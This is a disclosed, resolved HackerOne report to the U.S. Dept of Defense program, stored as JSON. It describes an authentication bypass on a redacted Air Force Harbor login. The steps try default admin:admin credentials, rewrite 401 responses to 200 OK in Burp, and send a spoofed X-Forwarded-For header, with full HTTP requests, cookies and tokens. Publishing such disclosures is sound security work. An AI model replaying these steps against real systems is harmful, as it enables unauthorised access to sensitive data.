@@ -1,0 +1,117 @@
+{
+  "id": 1690548,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjkwNTQ4",
+  "url": "https://hackerone.com/reports/1690548",
+  "title": "Authentication bypass leads to Information Disclosure at  U.S Air Force \"https://███\"",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-09-03T18:59:39.711Z",
+  "submitted_at": "2022-09-03T19:07:07.081Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "h41th3m",
+    "url": "/h41th3m",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ytmq75gbk69glcyejnde8thcljta/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-10-14T17:01:38.866Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-16T14:15:48.438Z",
+  "team_member_agreed_on_going_public_at": "2022-10-14T17:01:38.714Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Hackerone Triage team,\n\nI'm new in this program, what i understood that every Web Owned/Operated by DoD is in scope , so i did some google searches , exactly in wikipedia and i've find this PNG that confirms that U.S Air Force is in scope : https://en.wikipedia.org/wiki/United_States_Department_of_Defense#/media/File:DoD_Organization_December_2013.jpg\n\n\nAuthentication vulnerabilities are some of the simplest issues to understand. However, they can be among the most critical due to the obvious relationship between authentication and security. As well as potentially allowing attackers direct access to sensitive data and functionality, they also expose additional attack surface for further exploits. \n\nSo While testing AIR Force domain \"*.af.mil\" , i've find this subdomain `https://███/` that have a Login page , it's look like an Admin things , so i did some pentesting , and it's time to Authentication Bypass , especially because it uses APIs to deal with Database.\n\n## System Host(s)\n█████\n\n## Affected Product(s) and Version(s)\nU.S Air Force: af.mil\n\n## Steps to Reproduce\n#Steps for POC / Exploit :\n1.go \"https://████/harbor/sign-in\" , then username:password as : `admin:admin`\n2.Please be aware that we are going to intercept every single request in our Process of exploitation ,\n3.Before forwarding the request , using burp actions , use ; \n```\nDo intercept : response to this request\n```\n4.Change the Value of response :\n\n**From**\n```\nHTTP/1.1 401 Unauthorized\nvary: Cookie\nx-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==\nx-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631\ndate: Sat, 03 Sep 2022 18:42:09 GMT\ncontent-length: 0\nx-envoy-upstream-service-time: 1510\nserver: envoy\nconnection: close\n```\n**TO THIS and forwarded it **\n```\nHTTP/1.1 200 OK\nvary: Cookie\nx-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==\nx-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631\ndate: Sat, 03 Sep 2022 18:42:09 GMT\ncontent-length: 0\nx-envoy-upstream-service-time: 1510\nserver: envoy\nconnection: close\n\n```\n5.Ignore the second request about : `GET /api/v2.0/systeminfo HTTP/1.1` not neccaserry\n6.Intercept again and use methods in 3,4:\n```\nGET /api/v2.0/users/current HTTP/1.1\nHost: █████\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nCache-Control: no-cache\nPragma: no-cache\nConnection: close\nReferer: https://█████/harbor/sign-in\nCookie: sid=a66e49e995c2fe659086de2237f422c2; _gorilla_csrf=MTY2MjIyOTI3N3xJa05hUkhFeWNGTXhNbU5CUzNwVE1XNU5LM1o0Y2k5WlJWY3ZOVGR1WlZCM2FIRk9jMHBXTUdKc05FVTlJZ289fB0DLyMK59qRUoo_SpL9Sv0QZkyDGLDVGMNa9_UYMSWz\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-FORWARDED-FOR: 127.0.0.1\n```\n**Change it from*\n```\nHTTP/1.1 401 Unauthorized\ncontent-type: application/json; charset=utf-8\nvary: Cookie, Accept-Encoding\nx-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==\nx-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7\ndate: Sat, 03 Sep 2022 18:45:12 GMT\nx-envoy-upstream-service-time: 3\nserver: envoy\nconnection: close\nContent-Length: 61\n\n{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"UnAuthorize\"}]}\n```\n\n**To**\n```\nHTTP/1.1 200 OK\ncontent-type: application/json; charset=utf-8\nvary: Cookie, Accept-Encoding\nx-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==\nx-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7\ndate: Sat, 03 Sep 2022 18:45:12 GMT\nx-envoy-upstream-service-time: 3\nserver: envoy\nconnection: close\nContent-Length: 61\n\n{\"message\":\"Authorized\"}\n```\n\n7.Keep intercepting any request and check if response header and body are :\n\n```\nHTTP/1.1 401 Unauthorized\n\n{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"UnAuthorize\"}]}\n\n```\n\nto\n```\nHTTP/1.1 200 OK\n{\"message\":Authorized}\n```\n\n\n**Then BOOM , i was able to enter your data as shown in my ScreenShots , and for sure that when i tap in Profile , i can see UserProfile** \n\n████████\n██████\n██████████\n\n#Please be aware that :\n\nI wanted to stop my Hacking Process here , for not damaging or harm or delete any data for the server , so if you want to go further with exploitation to increase the impact or clear you mind that is a valid Bug, please let me know as soon as possible\n\n\n## Impact\n\nSensitive Information Disclosure\n\nResults that i've find so far:\n\n```\n█████████████████████████\n```\nBurp ScreenShot :\n██████████\n\n\n",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 10,
+  "voters": [
+    "zy9ard3",
+    "nayeems3c",
+    "mohaned0101",
+    "pr0f0x01",
+    "khizer47",
+    "5eyavan",
+    "shivammusic",
+    "0x307",
+    "destinedtohack",
+    "amr4l44"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
